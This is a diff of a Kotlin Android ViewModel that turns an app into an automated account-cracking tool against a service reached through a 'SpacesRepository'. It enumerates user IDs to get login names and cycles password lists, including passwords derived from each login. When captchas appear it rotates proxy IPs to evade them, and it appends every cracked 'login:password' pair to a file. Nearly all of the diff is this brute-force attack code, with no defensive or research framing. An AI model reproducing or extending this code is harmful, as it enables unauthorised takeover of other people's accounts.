@@ -1,26 +1,22 @@
 package com.disak.zaebali.ui
 import androidx.lifecycle.*
 import com.disak.zaebali.R
-import com.disak.zaebali.extensions.singleArgViewModelFactory
-import com.disak.zaebali.net.ProxyProcessor
 import com.disak.zaebali.repository.SpacesRepository
-import com.disak.zaebali.vo.User
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import com.disak.zaebali.models.Result
-import com.disak.zaebali.repository.ResourceProvider
+import com.disak.zaebali.net.*
+import com.disak.zaebali.repository.FileRepository
+import com.disak.zaebali.repository.ResourceRepository
+import kotlinx.coroutines.Job
 import java.util.*
 
-class MainViewModel(private val resourceProvider: ResourceProvider) : ViewModel() {
-    companion object {
-        val FACTORY = singleArgViewModelFactory(::MainViewModel)
-    }
-    private var spacesRepository: SpacesRepository = SpacesRepository.getInstance()
-
-    var userLiveData = spacesRepository.userLiveData
-    var authLiveData = spacesRepository.authLiveData
-
+class MainViewModel(
+    private val resourceRepository: ResourceRepository,
+    private var spacesRepository: SpacesRepository,
+    private var fileRepository: FileRepository
+) : ViewModel() {
     private val _currentUserId = MutableLiveData<Int>()
     val currentUserId: LiveData<Int> = _currentUserId
     private val _errorLiveData = MutableLiveData<String>()
@@ -29,30 +25,54 @@ class MainViewModel(private val resourceProvider: ResourceProvider) : ViewModel(
     val log: LiveData<String> = _log
     val isProgress = MutableLiveData<Boolean>()
 
+    private val _checked = MutableLiveData<Int>().apply {
+        value = 0
+    }
+    val checked: LiveData<Int> = _checked
+    private val _success = MutableLiveData<Int>().apply {
+        value = 0
+    }
+    val success: LiveData<Int> = _success
+
     var passwords = mutableListOf<String>()
     var extraPasswords = mutableListOf<String>()
     private var currentPassword = 0
     var loginList = mutableListOf<String>()
     var login = ""
     var targetName: String? = null
+    var target: String? = null
+    var job: Job? = null
+    var passwordEqualLogin: Boolean = false
+    var passwordEqualLoginLower: Boolean = false
 
     private fun getUserById(userId: Int) {
-        _currentUserId.value = userId
+        _currentUserId.postValue(userId)
 
-        CoroutineScope(Dispatchers.IO).launch {
-            spacesRepository.getUserById(userId)
+        job = CoroutineScope(Dispatchers.IO).launch {
+            when(val result = spacesRepository.getUserById(userId)) {
+                is Result.Success -> {
+                    login = result.data.ownerName?: ""
+
+                    if(login.isEmpty()) {
+                        nextUser()
+                    } else beginUser()
+                }
+                is Result.Error -> {
+                    _log.postValue(result.exception.message)
+                    nextUser()
+                }
+            }
         }
     }
 
-    fun nextProxy() {
-        viewModelScope.launch(Dispatchers.IO) {
+    private fun nextProxy() {
+        job = viewModelScope.launch(Dispatchers.IO) {
             ProxyProcessor.changeIp()
-
-            beginUser()
+            retryUser()
         }
     }
 
-    fun addLoginPassword(lower: Boolean) {
+    private fun addLoginPassword(lower: Boolean) {
         if(login.startsWith("_")) {
             val index = login.indexOf("_", 2)
             val pass= login.substring(index + 1, login.length)
@@ -67,18 +87,55 @@ class MainViewModel(private val resourceProvider: ResourceProvider) : ViewModel(
         }
     }
 
-    fun removeLoginPassword() {
+    private fun removeLoginPassword() {
         passwords.removeAll(extraPasswords)
         extraPasswords.clear()
     }
 
     private fun login(login: String, password: String) {
-        CoroutineScope(Dispatchers.IO).launch {
-            spacesRepository.login(login, password)
+        job = CoroutineScope(Dispatchers.IO).launch {
+            when(val result = spacesRepository.login(login, password)) {
+                is Result.Success -> {
+                    _checked.postValue(_checked.value!! + 1)
+                    val passLog = "(${currentPassword + 1}/${passwords.size}) ${result.data.password}"
+                    when (result.data.code) {
+                        CODE_SUCCESS -> {
+                            _log.postValue(resourceRepository.getString(R.string.success, passLog))
+                            putResults(result.data.login, result.data.password)
+                            _success.postValue(_success.value!! + 1)
+                            nextUser()
+                        }
+                        CODE_WRONG_LOGIN_OR_PASSWORD -> {
+                            _log.postValue(resourceRepository.getString(R.string.wrong_password, passLog))
+                            nextPassword()
+                        }
+                        CODE_ERR_WRONG_CAPTCHA_CODE -> {
+                            _log.postValue(resourceRepository.getString(R.string.wrong_captcha, passLog))
+                            nextProxy()
+                        }
+                        CODE_ERR_NEED_CAPTCHA -> {
+                            _log.postValue(resourceRepository.getString(R.string.need_captcha, passLog))
+                            nextProxy()
+                        }
+                        CODE_ERR_USER_NOT_FOUND -> {
+                            _log.postValue(resourceRepository.getString(R.string.user_not_found, passLog))
+                            nextUser()
+                        }
+                        else -> {
+                            _log.postValue(resourceRepository.getString(R.string.unknown_error, passLog))
+                            nextUser()
+                        }
+                    }
+                }
+
+                is Result.Error -> {
+                    _log.postValue(result.exception.message)
+                }
+            }
         }
     }
 
-    fun nextPassword() {
+    private fun nextPassword() {
         currentPassword++
         currentPassword %= passwords.size
 
@@ -86,36 +143,60 @@ class MainViewModel(private val resourceProvider: ResourceProvider) : ViewModel(
         else login(login, passwords[currentPassword])
     }
 
-    fun beginUser() {
-        passwords.addAll(extraPasswords)
+    private fun retryUser() {
         if(passwords.isEmpty()) {
-            _errorLiveData.postValue(resourceProvider.getString(R.string.need_passwords))
+            _errorLiveData.postValue(resourceRepository.getString(R.string.need_passwords))
+        } else login(login, passwords[currentPassword])
+    }
+
+    private fun beginUser() {
+        removeLoginPassword()
+        if (passwordEqualLogin) {
+            addLoginPassword(false)
+        }
+        if (passwordEqualLoginLower) {
+            addLoginPassword(true)
+        }
+        _log.postValue(resourceRepository.getString(R.string.current_user, this@MainViewModel.login))
+        passwords.addAll(extraPasswords)
+
+        if(passwords.isEmpty()) {
+            _errorLiveData.postValue(resourceRepository.getString(R.string.need_passwords))
         } else login(login, passwords[currentPassword])
     }
 
     fun begin(userId: Int) {
-        if(targetName.isNullOrBlank()) {
-            _errorLiveData.postValue(resourceProvider.getString(R.string.target_not_set))
+        if(target.isNullOrBlank()) {
+            _errorLiveData.postValue(resourceRepository.getString(R.string.target_not_set))
         } else {
             isProgress.postValue(true)
-            getUserById(userId)
+            _log.postValue(resourceRepository.getString(R.string.start))
+            if(loginList.isEmpty()) getUserById(userId)
+            else nextUser()
+        }
+    }
+
+    private fun putResults(login: String, password: String) {
+        target?.let { target ->
+            val stream = fileRepository.openOutputStream(target, "wa")
+            stream?.use { it.write("$login:$password\n".toByteArray()) }
         }
     }
 
     fun stop() {
+        job?.cancel()
+        _log.postValue(resourceRepository.getString(R.string.stopped))
         isProgress.postValue(false)
     }
 
-    fun nextUser() {
-        if (isProgress.value != true) return
-
+    private fun nextUser() {
         if(loginList.isEmpty()) {
             val uid = (_currentUserId.value ?: 0) + 1
             getUserById(uid)
         } else {
-            val login = loginList.first()
+            login = loginList.first()
             loginList.remove(login)
-            userLiveData.postValue(Result.Success(User(login)))
+            beginUser()
         }
     }
 }
